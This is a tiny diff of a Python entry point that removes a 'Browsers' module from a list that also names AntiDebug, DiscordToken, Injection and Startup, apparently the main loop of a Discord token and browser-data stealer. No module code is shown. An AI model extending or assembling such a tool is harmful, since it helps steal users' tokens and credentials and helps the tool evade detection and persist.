@@ -8,7 +8,6 @@ from src.config import __CONFIG__
 def main():
     funcs = [
         AntiDebug,
-        Browsers,
         DiscordToken,
         Injection,
         Startup,
